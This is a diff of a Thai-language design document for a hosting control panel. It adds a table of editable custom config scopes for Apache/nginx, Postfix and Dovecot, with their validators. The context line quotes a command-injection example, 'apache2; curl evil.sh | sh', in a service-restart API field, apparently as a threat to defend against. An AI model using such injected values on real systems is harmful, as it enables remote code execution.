@@ -202,6 +202,18 @@ POST /api/service/restart  {"service": "apache2; curl evil.sh | sh"}
 | ขนาด/รูปแบบ | จำกัด 64 KB · ปฏิเสธไบต์ศูนย์ |
 | ตามรอย | audit ทุกครั้งพร้อมเส้นทางไฟล์เต็ม |
 
+**ขอบเขตที่เปิดให้แก้ตอนนี้** — เพิ่มขอบเขตใหม่ทำที่ `ConfigFileCatalog` ที่เดียว
+กติกาทุกข้อข้างบนบังคับใช้กับไฟล์ใหม่โดยอัตโนมัติ:
+
+| ขอบเขต | ไฟล์ที่แก้ได้ | บริบท / วิธีที่ค่าถูกนำไปใช้ | ตัวตรวจ |
+|---|---|---|---|
+| เว็บไซต์ | `custom/apache\|nginx/<โดเมน>/custom.conf` | `IncludeOptional` / `include` แบบ mask ใน `<VirtualHost>` / `server {}` | `apachectl configtest` · `nginx -t` |
+| เมล | `custom/postfix/custom.cf` | **ผนวกท้าย `main.cf`** — Postfix ไม่มีคำสั่ง include และใช้ค่าที่ประกาศทีหลัง | `postfix check` |
+| เมล | `custom/dovecot/custom.conf` | `!include_try` ท้าย `99-phpcp.conf` | `doveconf -n` |
+
+`!include_try` ไม่ใช่ `!include` โดยเจตนา — อย่างหลังทำให้ Dovecot สตาร์ตไม่ขึ้นทั้งตัว
+บนเครื่องที่ยังไม่เคยเขียนค่าเพิ่ม ซึ่งเป็นเครื่องส่วนใหญ่
+
 ชั้นที่คนมักลืมคือชั้นรองสุดท้าย: **`configtest` ตอบแค่ว่าไวยากรณ์ถูก ไม่ได้ตอบว่าเว็บ
 ยังใช้งานได้** · กฎที่เขียนถูกทุกตัวอักษรแต่บล็อกทุกคำขอ หรือ redirect วนไม่รู้จบ
 ผ่าน configtest สบาย ๆ
